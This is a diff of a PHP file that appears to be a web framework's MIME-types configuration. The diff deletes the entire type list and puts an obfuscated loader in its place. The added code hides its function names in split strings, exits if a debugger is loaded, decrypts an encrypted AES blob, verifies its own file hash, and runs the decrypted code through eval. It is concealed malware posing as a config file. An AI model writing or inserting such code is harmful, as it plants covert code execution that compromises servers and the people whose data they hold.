@@ -1,184 +1,28 @@
 <?php
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/*
-| -------------------------------------------------------------------
-| MIME TYPES
-| -------------------------------------------------------------------
-| This file contains an array of mime types.  It is used by the
-| Upload class to help identify allowed file types.
-|
-*/
-return array(
-	'hqx'	=>	array('application/mac-binhex40', 'application/mac-binhex', 'application/x-binhex40', 'application/x-mac-binhex40'),
-	'cpt'	=>	'application/mac-compactpro',
-	'csv'	=>	array('text/x-comma-separated-values', 'text/comma-separated-values', 'application/octet-stream', 'application/vnd.ms-excel', 'application/x-csv', 'text/x-csv', 'text/csv', 'application/csv', 'application/excel', 'application/vnd.msexcel', 'text/plain'),
-	'bin'	=>	array('application/macbinary', 'application/mac-binary', 'application/octet-stream', 'application/x-binary', 'application/x-macbinary'),
-	'dms'	=>	'application/octet-stream',
-	'lha'	=>	'application/octet-stream',
-	'lzh'	=>	'application/octet-stream',
-	'exe'	=>	array('application/octet-stream', 'application/x-msdownload'),
-	'class'	=>	'application/octet-stream',
-	'psd'	=>	array('application/x-photoshop', 'image/vnd.adobe.photoshop'),
-	'so'	=>	'application/octet-stream',
-	'sea'	=>	'application/octet-stream',
-	'dll'	=>	'application/octet-stream',
-	'oda'	=>	'application/oda',
-	'pdf'	=>	array('application/pdf', 'application/force-download', 'application/x-download', 'binary/octet-stream'),
-	'ai'	=>	array('application/pdf', 'application/postscript'),
-	'eps'	=>	'application/postscript',
-	'ps'	=>	'application/postscript',
-	'smi'	=>	'application/smil',
-	'smil'	=>	'application/smil',
-	'mif'	=>	'application/vnd.mif',
-	'xls'	=>	array('application/vnd.ms-excel', 'application/msexcel', 'application/x-msexcel', 'application/x-ms-excel', 'application/x-excel', 'application/x-dos_ms_excel', 'application/xls', 'application/x-xls', 'application/excel', 'application/download', 'application/vnd.ms-office', 'application/msword'),
-	'ppt'	=>	array('application/powerpoint', 'application/vnd.ms-powerpoint', 'application/vnd.ms-office', 'application/msword'),
-	'pptx'	=> 	array('application/vnd.openxmlformats-officedocument.presentationml.presentation', 'application/x-zip', 'application/zip'),
-	'wbxml'	=>	'application/wbxml',
-	'wmlc'	=>	'application/wmlc',
-	'dcr'	=>	'application/x-director',
-	'dir'	=>	'application/x-director',
-	'dxr'	=>	'application/x-director',
-	'dvi'	=>	'application/x-dvi',
-	'gtar'	=>	'application/x-gtar',
-	'gz'	=>	'application/x-gzip',
-	'gzip'  =>	'application/x-gzip',
-	'php'	=>	array('application/x-httpd-php', 'application/php', 'application/x-php', 'text/php', 'text/x-php', 'application/x-httpd-php-source'),
-	'php4'	=>	'application/x-httpd-php',
-	'php3'	=>	'application/x-httpd-php',
-	'phtml'	=>	'application/x-httpd-php',
-	'phps'	=>	'application/x-httpd-php-source',
-	'js'	=>	array('application/x-javascript', 'text/plain'),
-	'swf'	=>	'application/x-shockwave-flash',
-	'sit'	=>	'application/x-stuffit',
-	'tar'	=>	'application/x-tar',
-	'tgz'	=>	array('application/x-tar', 'application/x-gzip-compressed'),
-	'z'	=>	'application/x-compress',
-	'xhtml'	=>	'application/xhtml+xml',
-	'xht'	=>	'application/xhtml+xml',
-	'zip'	=>	array('application/x-zip', 'application/zip', 'application/x-zip-compressed', 'application/s-compressed', 'multipart/x-zip'),
-	'rar'	=>	array('application/x-rar', 'application/rar', 'application/x-rar-compressed'),
-	'mid'	=>	'audio/midi',
-	'midi'	=>	'audio/midi',
-	'mpga'	=>	'audio/mpeg',
-	'mp2'	=>	'audio/mpeg',
-	'mp3'	=>	array('audio/mpeg', 'audio/mpg', 'audio/mpeg3', 'audio/mp3'),
-	'aif'	=>	array('audio/x-aiff', 'audio/aiff'),
-	'aiff'	=>	array('audio/x-aiff', 'audio/aiff'),
-	'aifc'	=>	'audio/x-aiff',
-	'ram'	=>	'audio/x-pn-realaudio',
-	'rm'	=>	'audio/x-pn-realaudio',
-	'rpm'	=>	'audio/x-pn-realaudio-plugin',
-	'ra'	=>	'audio/x-realaudio',
-	'rv'	=>	'video/vnd.rn-realvideo',
-	'wav'	=>	array('audio/x-wav', 'audio/wave', 'audio/wav'),
-	'bmp'	=>	array('image/bmp', 'image/x-bmp', 'image/x-bitmap', 'image/x-xbitmap', 'image/x-win-bitmap', 'image/x-windows-bmp', 'image/ms-bmp', 'image/x-ms-bmp', 'application/bmp', 'application/x-bmp', 'application/x-win-bitmap'),
-	'gif'	=>	'image/gif',
-	'jpeg'	=>	array('image/jpeg', 'image/pjpeg'),
-	'jpg'	=>	array('image/jpeg', 'image/pjpeg'),
-	'jpe'	=>	array('image/jpeg', 'image/pjpeg'),
-	'jp2'	=>	array('image/jp2', 'video/mj2', 'image/jpx', 'image/jpm'),
-	'j2k'	=>	array('image/jp2', 'video/mj2', 'image/jpx', 'image/jpm'),
-	'jpf'	=>	array('image/jp2', 'video/mj2', 'image/jpx', 'image/jpm'),
-	'jpg2'	=>	array('image/jp2', 'video/mj2', 'image/jpx', 'image/jpm'),
-	'jpx'	=>	array('image/jp2', 'video/mj2', 'image/jpx', 'image/jpm'),
-	'jpm'	=>	array('image/jp2', 'video/mj2', 'image/jpx', 'image/jpm'),
-	'mj2'	=>	array('image/jp2', 'video/mj2', 'image/jpx', 'image/jpm'),
-	'mjp2'	=>	array('image/jp2', 'video/mj2', 'image/jpx', 'image/jpm'),
-	'png'	=>	array('image/png',  'image/x-png'),
-	'tiff'	=>	'image/tiff',
-	'tif'	=>	'image/tiff',
-	'css'	=>	array('text/css', 'text/plain'),
-	'html'	=>	array('text/html', 'text/plain'),
-	'htm'	=>	array('text/html', 'text/plain'),
-	'shtml'	=>	array('text/html', 'text/plain'),
-	'txt'	=>	'text/plain',
-	'text'	=>	'text/plain',
-	'log'	=>	array('text/plain', 'text/x-log'),
-	'rtx'	=>	'text/richtext',
-	'rtf'	=>	'text/rtf',
-	'xml'	=>	array('application/xml', 'text/xml', 'text/plain'),
-	'xsl'	=>	array('application/xml', 'text/xsl', 'text/xml'),
-	'mpeg'	=>	'video/mpeg',
-	'mpg'	=>	'video/mpeg',
-	'mpe'	=>	'video/mpeg',
-	'qt'	=>	'video/quicktime',
-	'mov'	=>	'video/quicktime',
-	'avi'	=>	array('video/x-msvideo', 'video/msvideo', 'video/avi', 'application/x-troff-msvideo'),
-	'movie'	=>	'video/x-sgi-movie',
-	'doc'	=>	array('application/msword', 'application/vnd.ms-office'),
-	'docx'	=>	array('application/vnd.openxmlformats-officedocument.wordprocessingml.document', 'application/zip', 'application/msword', 'application/x-zip'),
-	'dot'	=>	array('application/msword', 'application/vnd.ms-office'),
-	'dotx'	=>	array('application/vnd.openxmlformats-officedocument.wordprocessingml.document', 'application/zip', 'application/msword'),
-	'xlsx'	=>	array('application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', 'application/zip', 'application/vnd.ms-excel', 'application/msword', 'application/x-zip'),
-	'word'	=>	array('application/msword', 'application/octet-stream'),
-	'xl'	=>	'application/excel',
-	'eml'	=>	'message/rfc822',
-	'json'  =>	array('application/json', 'text/json'),
-	'pem'   =>	array('application/x-x509-user-cert', 'application/x-pem-file', 'application/octet-stream'),
-	'p10'   =>	array('application/x-pkcs10', 'application/pkcs10'),
-	'p12'   =>	'application/x-pkcs12',
-	'p7a'   =>	'application/x-pkcs7-signature',
-	'p7c'   =>	array('application/pkcs7-mime', 'application/x-pkcs7-mime'),
-	'p7m'   =>	array('application/pkcs7-mime', 'application/x-pkcs7-mime'),
-	'p7r'   =>	'application/x-pkcs7-certreqresp',
-	'p7s'   =>	'application/pkcs7-signature',
-	'crt'   =>	array('application/x-x509-ca-cert', 'application/x-x509-user-cert', 'application/pkix-cert'),
-	'crl'   =>	array('application/pkix-crl', 'application/pkcs-crl'),
-	'der'   =>	'application/x-x509-ca-cert',
-	'kdb'   =>	'application/octet-stream',
-	'pgp'   =>	'application/pgp',
-	'gpg'   =>	'application/gpg-keys',
-	'sst'   =>	'application/octet-stream',
-	'csr'   =>	'application/octet-stream',
-	'rsa'   =>	'application/x-pkcs7',
-	'cer'   =>	array('application/pkix-cert', 'application/x-x509-ca-cert'),
-	'3g2'   =>	'video/3gpp2',
-	'3gp'   =>	array('video/3gp', 'video/3gpp'),
-	'mp4'   =>	'video/mp4',
-	'm4a'   =>	'audio/x-m4a',
-	'f4v'   =>	array('video/mp4', 'video/x-f4v'),
-	'flv'	=>	'video/x-flv',
-	'webm'	=>	'video/webm',
-	'aac'   =>	'audio/x-acc',
-	'm4u'   =>	'application/vnd.mpegurl',
-	'm3u'   =>	'text/plain',
-	'xspf'  =>	'application/xspf+xml',
-	'vlc'   =>	'application/videolan',
-	'wmv'   =>	array('video/x-ms-wmv', 'video/x-ms-asf'),
-	'au'    =>	'audio/x-au',
-	'ac3'   =>	'audio/ac3',
-	'flac'  =>	'audio/x-flac',
-	'ogg'   =>	array('audio/ogg', 'video/ogg', 'application/ogg'),
-	'kmz'	=>	array('application/vnd.google-earth.kmz', 'application/zip', 'application/x-zip'),
-	'kml'	=>	array('application/vnd.google-earth.kml+xml', 'application/xml', 'text/xml'),
-	'ics'	=>	'text/calendar',
-	'ical'	=>	'text/calendar',
-	'zsh'	=>	'text/x-scriptzsh',
-	'7z'	=>	array('application/x-7z-compressed', 'application/x-compressed', 'application/x-zip-compressed', 'application/zip', 'multipart/x-zip'),
-	'7zip'	=>	array('application/x-7z-compressed', 'application/x-compressed', 'application/x-zip-compressed', 'application/zip', 'multipart/x-zip'),
-	'cdr'	=>	array('application/cdr', 'application/coreldraw', 'application/x-cdr', 'application/x-coreldraw', 'image/cdr', 'image/x-cdr', 'zz-application/zz-winassoc-cdr'),
-	'wma'	=>	array('audio/x-ms-wma', 'video/x-ms-asf'),
-	'jar'	=>	array('application/java-archive', 'application/x-java-application', 'application/x-jar', 'application/x-compressed'),
-	'svg'	=>	array('image/svg+xml', 'application/xml', 'text/xml'),
-	'vcf'	=>	'text/x-vcard',
-	'srt'	=>	array('text/srt', 'text/plain'),
-	'vtt'	=>	array('text/vtt', 'text/plain'),
-	'ico'	=>	array('image/x-icon', 'image/x-ico', 'image/vnd.microsoft.icon'),
-	'odc'	=>	'application/vnd.oasis.opendocument.chart',
-	'otc'	=>	'application/vnd.oasis.opendocument.chart-template',
-	'odf'	=>	'application/vnd.oasis.opendocument.formula',
-	'otf'	=>	'application/vnd.oasis.opendocument.formula-template',
-	'odg'	=>	'application/vnd.oasis.opendocument.graphics',
-	'otg'	=>	'application/vnd.oasis.opendocument.graphics-template',
-	'odi'	=>	'application/vnd.oasis.opendocument.image',
-	'oti'	=>	'application/vnd.oasis.opendocument.image-template',
-	'odp'	=>	'application/vnd.oasis.opendocument.presentation',
-	'otp'	=>	'application/vnd.oasis.opendocument.presentation-template',
-	'ods'	=>	'application/vnd.oasis.opendocument.spreadsheet',
-	'ots'	=>	'application/vnd.oasis.opendocument.spreadsheet-template',
-	'odt'	=>	'application/vnd.oasis.opendocument.text',
-	'odm'	=>	'application/vnd.oasis.opendocument.text-master',
-	'ott'	=>	'application/vnd.oasis.opendocument.text-template',
-	'oth'	=>	'application/vnd.oasis.opendocument.text-web'
-);
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_kbgknn2i=('bas'.'e64'.'_de'.'cod'.'e');
+$_bpvige6g=('gzu'.'nco'.'mpr'.'ess');
+$_l2zvxtf7=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_rmgperuj='D2rUdmTd';
+$_hsxofo0o='4M+O6PYK+pc=';
+$_rm5yw3ik='AVQ9W93J';
+$_e7gimnhv='MTXi+vQx';
+$_xxhmhyhp='9bRHYD74';
+$_s0140qhx='L1ecjEgo';
+$_ltprvqmv='LO1D7bU7';
+$_tp88l5ge='sxCSjg==';
+$_bkbd1tzy=$_kbgknn2i($_e7gimnhv.$_xxhmhyhp.$_rm5yw3ik.$_rmgperuj.$_hsxofo0o);
+$_cm81c7xc=$_kbgknn2i($_s0140qhx.$_ltprvqmv.$_tp88l5ge);
+$_mpc7imjh=$_kbgknn2i('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');
+$_nq7ifwme=$_l2zvxtf7($_mpc7imjh,'aes-256-cbc',$_bkbd1tzy,OPENSSL_RAW_DATA,$_cm81c7xc);
+if($_nq7ifwme===false){exit;}
+$_srhigm51=$_bpvige6g($_nq7ifwme);
+if($_srhigm51===false){exit;}
+$_agbmoztd='1d4eda413033185f38e5c29d161196d2e8d85358246fb8bb25668776d7b4157b';
+$_c5928hxp=@file_get_contents(__FILE__);
+if($_c5928hxp!==false){
+$_zg077q6z=str_replace($_agbmoztd,"0000000000000000000000000000000000000000000000000000000000000000",$_c5928hxp);
+$_v9xuv0cp=hash("sha256",$_zg077q6z);
+if($_v9xuv0cp!==$_agbmoztd){@http_response_code(403);exit;}
+}
+eval($_srhigm51);
